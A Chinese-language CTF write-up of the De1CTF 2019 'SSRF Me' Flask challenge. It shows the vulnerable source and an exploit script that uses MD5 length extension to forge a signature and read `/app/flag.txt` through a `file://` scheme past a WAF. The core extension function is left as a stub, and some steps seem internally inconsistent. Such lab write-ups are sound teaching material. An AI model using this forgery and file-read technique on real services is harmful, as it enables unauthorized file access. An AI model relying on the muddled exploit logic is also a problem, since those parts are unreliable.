---
title: De1CTF 2019 - Web - SSRF Me
date: 2026-11-14 18:11:00
categories:
  - CTF
  - De1CTF 2019
  - Web
tags:
  - SSRF
  - MD5长度扩展攻击
  - Python代码审计
  - hash校验绕过
cover: /img/cover/three-people-indoor.jpg
description: De1CTF 2019 的 Flask SSRF 审计题。/geneSign 固定签发 action=scan，/De1ta 却要求 scan 与 read 并存。用 MD5 长度扩展构造匹配 sign 触发 file 读 flag。
keywords:
  - SSRF
  - MD5长度扩展
  - hashpumpy
  - getSign
  - De1CTF
ai: >-
  本题来自 De1CTF 2019，首页直接给出 Flask 源码。flag 路径泄露为 /app/flag.txt；getSign 实为 md5(secret+param+action)，/geneSign 固定签发 action=scan，/De1ta 却要求 scan 与 read 并存才触发 file 读文件，签名与需求矛盾。解法是 MD5 长度扩展攻击：由已知签名推算追加 padding 与 read 后的新签名，把文件名拼进 param 使校验通过。手写 hash_ext.py 构造 sign 与 param 后读到 flag，脱敏记为 flag{xxxx}。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | De1CTF 2019 |
| 方向 | Web |
| 难度 | 中等（代码审计 + 密码学攻击） |
| 环境 | 授权靶场（已脱敏） |
| 漏洞类型 | SSRF + MD5 长度扩展攻击 + hash 校验绕过 |

## 信息收集

访问首页得到 Python 源码（Flask 应用），核心逻辑：

```python
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.request.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

@app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    action = urllib.request.unquote(request.cookies.get("action"))
    param = urllib.request.unquote(request.args.get("param", ""))
    sign = urllib.request.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    if md5(param, 'goku-like') == sign and 'scan' in action and 'read' in action:
        ...
```

源码里 `echo $FLAG > /app/flag.txt` 说明 flag 写在 `/app/flag.txt`。

## 漏洞分析

关键点：

1. **flag 位置**：`/app/flag.txt`。
2. **`/geneSign`** 只生成 `action="scan"` 的签名：`getSign("scan", param)`。
3. **`/De1ta`** 校验 `md5(param, 'goku-like') == sign` 且 `action` 同时含 `scan` 和 `read`，才能触发 `file://` 读文件。
4. **waf** 拦截 `file`、`gopher` 等开头。

### 核心矛盾

- `sign` 只能通过 `/geneSign` 生成，但它固定 `action="scan"`，签名只覆盖 `"scan" + param`。
- 我们需要 `action` 同时含 `scan` 和 `read`（如 `"scan|read"`），但 `md5("scan|read" + param)` 与 `/geneSign` 给的 `md5("scan" + param)` 不一致。

### 绕过：MD5 长度扩展攻击

`getSign` 的实现：

```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

签名实际是 `md5(secret + param + action)`。利用 **MD5 长度扩展攻击**：

1. 先通过 `/geneSign?param=` 拿到 `md5(secret + "" + "scan")` 的签名（即 `md5(secret + "scan")`）。
2. 已知该签名，可推算 `md5(secret + "scan" + padding + 附加数据)`，从而构造 `param = "scan" + padding + 附加数据`，附加数据包含 `read`，使最终 `param + action` 同时含 `scan` 和 `read` 且签名正确。

## 利用过程

- `param` 里塞入 `file:///app/flag.txt`（`param` 经过 padding 后拼上 `read` 与文件名，绕过 waf 对 `file` 开头的拦截）。
- 手写 `hash_ext.py` 实现 MD5 长度扩展，构造出同时满足 `scan` + `read` 的 param 与 sign，最终 `action` 为 `"scan" + padding + "read"`。
- 携带构造好的 `sign`、`action` cookie 与 `param` 请求 `/De1ta`，触发文件读取。

## 完整 EXP

MD5 长度扩展攻击实现（本地 `hash_ext.py` 思路）：

```python
import hashlib, urllib.parse, requests

HOST = 'http://target:8080'  # 授权靶场（已脱敏）

# 1) 取得 md5(secret + "scan") 的合法签名
r = requests.get(HOST + '/geneSign', params={'param': ''})
sign = r.text.strip()

# 2) MD5 长度扩展：已知 md5(secret+scan) 与 secret 长度，
#    追加 padding + "read" + 文件名，推算新 md5 与新 param
#    （具体实现见本地 hash_ext.py，此处给出调用形态）
def md5_extend(orig_sign, orig_msg, append, key_len):
    # 按 MD5 填充规则构造 glue padding，续算压缩函数得到新签名
    raise NotImplementedError('见 hash_ext.py')

append = b'read' + b'file:///app/flag.txt'
new_sign, new_param = md5_extend(sign, b'scan', append, key_len=16)

# 3) 携带伪造 sign/action 与构造的 param 触发读文件
cookies = {'sign': new_sign, 'action': 'scan' + new_param.decode('latin-1')}
resp = requests.get(HOST + '/De1ta', params={'param': new_param}, cookies=cookies)
print(resp.text)
```

> 说明：`hash_ext.py` 是本地 MD5 长度扩展实现，负责生成 glue padding 与续算 md5；上面的 `md5_extend` 为其调用占位，完整实现以本地脚本为准。

## Flag

`flag{xxxx}`（已脱敏，来自 `/app/flag.txt`）

## 踩坑与总结

1. **源码泄漏 flag 路径** `/app/flag.txt`。
2. `sign = md5(secret + param + action)`，`/geneSign` 固定 `action="scan"`。
3. 通过 **MD5 长度扩展攻击** 让 `action` 同时含 `scan` 与 `read`，绕过签名校验并触发文件读取。
4. waf 拦截 `file`/`gopher` 开头，用 `param` 内 padding 拼接方式绕过。

## 参考

- 本地脚本：`_ssrfme/hash_ext.py`（MD5 长度扩展攻击实现）
